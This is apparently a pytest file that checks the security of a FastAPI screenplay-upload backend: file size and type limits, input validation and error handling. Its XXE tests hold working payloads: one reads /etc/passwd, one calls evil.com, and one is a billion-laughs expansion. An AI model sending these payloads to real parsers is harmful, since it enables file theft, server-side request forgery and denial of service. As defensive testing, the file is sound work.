"""
Security and Design Flaw Tests for Slavodej Backend

Tests cover:
- File upload security (size limits, file type validation)
- XXE vulnerability in XML parsing
- Input validation
- Error handling
"""

import pytest
from fastapi.testclient import TestClient
from io import BytesIO
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from main import app

client = TestClient(app)


class TestFileUploadSecurity:
    """Tests for file upload security vulnerabilities"""
    
    def test_upload_oversized_file(self):
        """Test that files over 10MB are rejected"""
        # Create a file larger than 10MB (11MB of zeros)
        large_content = b"0" * (11 * 1024 * 1024)
        files = {"file": ("large_script.pdf", BytesIO(large_content), "application/pdf")}
        
        response = client.post("/upload", files=files)
        
        # Should be rejected with 400 due to file size limit
        assert response.status_code == 400, f"Large file should be rejected, got {response.status_code}"
        assert "too large" in response.json().get("detail", "").lower()
    
    def test_upload_unsupported_file_type(self):
        """Test that unsupported file types are rejected"""
        content = b"malicious content"
        files = {"file": ("script.exe", BytesIO(content), "application/octet-stream")}
        
        response = client.post("/upload", files=files)
        
        assert response.status_code == 400
        assert "Unsupported file format" in response.json().get("detail", "")
    
    def test_upload_extension_bypass_attempt(self):
        """Test that double extensions don't bypass validation"""
        content = b"malicious content"
        files = {"file": ("script.pdf.exe", BytesIO(content), "application/octet-stream")}
        
        response = client.post("/upload", files=files)
        
        # Should reject because it doesn't end with .pdf or .fdx
        assert response.status_code == 400
    
    def test_upload_no_filename(self):
        """Test handling of upload with no filename"""
        content = b"some content"
        files = {"file": ("", BytesIO(content), "application/pdf")}
        
        response = client.post("/upload", files=files)
        
        # Empty filename should be rejected (400 or 422)
        assert response.status_code in [400, 422]
    
    def test_upload_empty_file(self):
        """Test handling of empty file upload"""
        files = {"file": ("empty.pdf", BytesIO(b""), "application/pdf")}
        
        response = client.post("/upload", files=files)
        
        # Empty file should be rejected with 400
        assert response.status_code == 400
        assert "empty" in response.json().get("detail", "").lower()


class TestXXEVulnerability:
    """Tests for XML External Entity (XXE) attacks"""
    
    def test_xxe_file_disclosure_attempt(self):
        """Test that XXE attacks attempting to read files are blocked"""
        # XXE payload attempting to read /etc/passwd
        xxe_payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<FinalDraft>
    <Content>
        <Paragraph Type="Action">
            <Text>&xxe;</Text>
        </Paragraph>
    </Content>
</FinalDraft>"""
        
        files = {"file": ("malicious.fdx", BytesIO(xxe_payload), "application/xml")}
        
        response = client.post("/upload", files=files)
        
        # Should not return contents of /etc/passwd
        if response.status_code == 200:
            response_text = str(response.json())
            assert "root:" not in response_text, "XXE vulnerability: /etc/passwd content leaked!"
            assert "xxe" not in response_text.lower() or "entity" not in response_text.lower()
    
    def test_xxe_ssrf_attempt(self):
        """Test that XXE attacks attempting SSRF are blocked"""
        # XXE payload attempting to make external request
        xxe_payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/steal">
]>
<FinalDraft>
    <Content>
        <Paragraph Type="Action">
            <Text>&xxe;</Text>
        </Paragraph>
    </Content>
</FinalDraft>"""
        
        files = {"file": ("malicious.fdx", BytesIO(xxe_payload), "application/xml")}
        
        response = client.post("/upload", files=files)
        
        # Should not crash and should not make external requests
        # Just verify it doesn't crash the server
        assert response.status_code in [200, 400, 422, 500]
    
    def test_billion_laughs_attack(self):
        """Test protection against billion laughs DoS attack"""
        # Billion laughs payload
        xxe_payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<FinalDraft>
    <Content>
        <Paragraph Type="Action">
            <Text>&lol4;</Text>
        </Paragraph>
    </Content>
</FinalDraft>"""
        
        files = {"file": ("dos.fdx", BytesIO(xxe_payload), "application/xml")}
        
        # This should either be blocked or handled without consuming excessive memory
        try:
            response = client.post("/upload", files=files, timeout=5)
            # If we get a response, good - it didn't hang
            assert response.status_code in [200, 400, 422, 500]
        except Exception:
            # Timeout or error is acceptable as long as server doesn't crash
            pass


class TestInputValidation:
    """Tests for input validation on API endpoints"""
    
    def test_rewrite_empty_selection(self):
        """Test that empty selection is handled"""
        response = client.post("/rewrite", json={
            "selection": "",
            "prompt": "Make it better"
        })
        
        # Should handle gracefully
        assert response.status_code in [400, 422, 500]
    
    def test_rewrite_empty_prompt(self):
        """Test that empty prompt is rejected"""
        response = client.post("/rewrite", json={
            "selection": "Some text",
            "prompt": ""
        })
        
        # Should be rejected by Pydantic validation (min_length=1)
        assert response.status_code == 422
    
    def test_rewrite_very_long_prompt(self):
        """Test that extremely long prompts are rejected"""
        # Prompt longer than max (10KB)
        long_prompt = "a" * 15000
        
        response = client.post("/rewrite", json={
            "selection": "Some text",
            "prompt": long_prompt
        })
        
        # Should be rejected by Pydantic validation (max_length)
        assert response.status_code == 422
    
    def test_rewrite_very_long_selection(self):
        """Test that extremely long selections are rejected"""
        # Selection longer than max (50KB)
        long_selection = "a" * 60000
        
        response = client.post("/rewrite", json={
            "selection": long_selection,
            "prompt": "Make it better"
        })
        
        # Should be rejected by Pydantic validation (max_length)
        assert response.status_code == 422
    
    def test_rewrite_missing_required_fields(self):
        """Test that missing required fields are rejected"""
        response = client.post("/rewrite", json={})
        
        assert response.status_code == 422  # Pydantic validation error
    
    def test_rewrite_invalid_json(self):
        """Test that invalid JSON is rejected"""
        response = client.post(
            "/rewrite",
            content=b"not valid json",
            headers={"Content-Type": "application/json"}
        )
        
        assert response.status_code == 422


class TestErrorHandling:
    """Tests for proper error handling"""
    
    def test_upload_corrupted_pdf(self):
        """Test handling of corrupted PDF files"""
        corrupted_pdf = b"%PDF-1.4 corrupted content here"
        files = {"file": ("corrupted.pdf", BytesIO(corrupted_pdf), "application/pdf")}
        
        response = client.post("/upload", files=files)
        
        # Should return 400 with a user-friendly error message
        assert response.status_code == 400
        detail = response.json().get("detail", "")
        # Should not leak stack traces
        assert "Traceback" not in str(detail)
        # Should have a meaningful error message
        assert "invalid" in detail.lower() or "corrupted" in detail.lower() or "failed" in detail.lower()
    
    def test_upload_malformed_fdx(self):
        """Test handling of malformed FDX (XML) files"""
        malformed_xml = b"<root><unclosed>"
        files = {"file": ("malformed.fdx", BytesIO(malformed_xml), "application/xml")}
        
        response = client.post("/upload", files=files)
        
        # Should handle gracefully
        assert response.status_code in [200, 400, 422, 500]
    
    def test_root_endpoint(self):
        """Test that root endpoint works"""
        response = client.get("/")
        
        assert response.status_code == 200
        assert "message" in response.json()


class TestDesignFlaws:
    """Tests for design flaws that could impact reliability"""
    
    def test_valid_pdf_upload(self):
        """Test that valid small PDF uploads work"""
        # Minimal valid PDF
        minimal_pdf = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000052 00000 n 
0000000101 00000 n 
trailer<</Size 4/Root 1 0 R>>
startxref
178
%%EOF"""
        
        files = {"file": ("valid.pdf", BytesIO(minimal_pdf), "application/pdf")}
        
        response = client.post("/upload", files=files)
        
        # Should succeed or gracefully fail (minimal PDF has no text)
        assert response.status_code in [200, 400]
    
    def test_valid_fdx_upload(self):
        """Test that valid FDX uploads work"""
        valid_fdx = b"""<?xml version="1.0" encoding="UTF-8"?>
<FinalDraft>
    <Content>
        <Paragraph Type="Scene Heading">
            <Text>INT. OFFICE - DAY</Text>
        </Paragraph>
        <Paragraph Type="Character">
            <Text>JOHN</Text>
        </Paragraph>
        <Paragraph Type="Dialogue">
            <Text>Hello, world!</Text>
        </Paragraph>
    </Content>
</FinalDraft>"""
        
        files = {"file": ("valid.fdx", BytesIO(valid_fdx), "application/xml")}
        
        response = client.post("/upload", files=files)
        
        assert response.status_code == 200
        data = response.json()
        assert "lines" in data
        assert "characters" in data
        assert "scenes" in data


# Summary of expected failures before fixes:
# - test_upload_oversized_file: FAIL (no size limit implemented)
# - test_xxe_file_disclosure_attempt: POTENTIALLY FAIL (XXE not disabled)
# - test_xxe_ssrf_attempt: POTENTIALLY FAIL (XXE not disabled)
# - test_billion_laughs_attack: POTENTIALLY FAIL (entity expansion not limited)
# - test_rewrite_very_long_prompt: FAIL (no input length limit)
# - test_rewrite_very_long_selection: FAIL (no input length limit)
